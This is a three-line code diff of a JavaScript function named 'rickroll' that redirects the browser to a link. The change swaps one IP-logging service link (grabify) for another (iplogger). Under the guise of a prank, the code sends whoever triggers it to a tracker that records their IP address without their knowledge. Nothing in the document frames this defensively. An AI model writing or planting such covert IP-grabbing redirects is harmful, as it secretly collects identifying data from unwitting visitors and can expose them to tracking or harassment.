@@ -1,3 +1,3 @@
 function rickroll() {
-    window.location.href = "https://grabify.link/H4SVO7";
+    window.location.href = "https://iplogger.org/29auc6";
 }
